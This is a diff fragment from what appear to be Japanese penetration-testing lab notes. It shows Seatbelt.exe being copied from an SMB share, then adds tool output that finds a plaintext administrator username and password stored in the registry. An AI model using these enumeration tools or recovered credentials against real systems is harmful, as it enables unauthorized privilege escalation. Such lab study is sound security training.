@@ -20,7 +20,13 @@ cp \\192.168.49.104\share\Seatbelt.exe .
 ### 実行結果抽出
 
 ```powershell
-
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry
+    Not Found
+    Not Found
+    UserName: administrator
+    Password: CarHammerChip964
+    Not Found
 ```
 
 
